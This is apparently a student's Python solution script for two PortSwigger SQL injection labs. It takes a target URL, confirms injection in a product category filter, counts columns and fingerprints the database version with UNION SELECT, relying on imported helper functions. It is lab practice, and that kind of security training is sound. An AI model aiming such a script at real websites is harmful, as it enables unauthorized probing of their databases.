# Lab 03 & 04 — SQL Injection: Query Database Type and Version
# PortSwigger (Lab 03): https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
# PortSwigger (Lab 04): https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
#
# Vulnerability: Product category filter
# Aim:           Determine the number of columns, then extract the DB version string
#
# Steps:
#   1. Confirm SQLi via '
#   2. Count columns with ORDER BY
#   3. Find a string-compatible column
#   4. Fingerprint the DB via UNION SELECT <version_expr>
#
# Usage: python lab3_4.py <url>

import sys
import urllib3
from sqli_utils import check_vulnerability, banner, section, get_number_of_columns, detect_db_type

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FILTER_PATH = "filter"


if __name__ == "__main__":
    banner()
    section("LAB 03 & 04 — DB TYPE AND VERSION DETECTION")

    if len(sys.argv) != 2:
        print("  Usage: python lab3_4.py <url>")
        sys.exit(1)

    target = sys.argv[1].rstrip("/") + "/"

    if not check_vulnerability(target, FILTER_PATH):
        print("\n  ✘  Target does not appear vulnerable. Exiting.")
        sys.exit(1)

    col_num = get_number_of_columns(target, FILTER_PATH)
    if col_num is None:
        print("\n  ✘  Could not determine column count. Exiting.")
        sys.exit(1)

    detect_db_type(target, col_num, FILTER_PATH)
